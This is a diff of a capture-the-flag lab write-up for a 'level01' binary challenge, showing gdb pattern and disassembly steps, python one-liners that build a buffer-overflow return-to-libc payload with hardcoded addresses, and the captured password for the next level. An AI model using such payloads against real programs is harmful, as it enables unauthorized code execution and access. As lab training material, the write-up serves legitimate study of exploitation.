@@ -19,7 +19,7 @@ gdb> pattern create 128
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA'
 gdb> r
 ********* ADMIN LOGIN PROMPT *********
-Enter Username: dat_wil
+Enter Username: dat_wil //  disass verify_user_name -> printf "%s" 0x80486a8
 verifying username....
 
 Enter Password:
@@ -55,7 +55,7 @@ gdb> disass main
 
 # We need to write 255 char for the first `fgets`
 # Then we prepare the payload
-$> python -c "print 'dat_wil' + 'B' * 248 + 'A' * 80 + '\xb5\x85\x04\x08' + '\xd0\xae\xe6\xf7' + 'DUMM' + '\xec\x97\xf8\xf7'" > /tmp/pl1
+$> python -c "print 'dat_wil' + 'B' * 248 + 'A' * 80 + '\xb5\x85\x04\x08' + '\xd0\xae\xe6\xf7' + 'DUMM' + '\xec\x97\xf8\xf7'" > /tmp/pl1 //(python -c "print 'dat_wil\n' + '\x90' * 80 + '\xf7\xe6\xae\xd0'[::-1] + '\xf7\xe5\xeb\x70'[::-1] + '\xf7\xf8\x97\xec'[::-1]"; cat) | ./level01
 $> cat /tmp/pl1 - | ./level1
 $ cat /home/users/level02/.pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
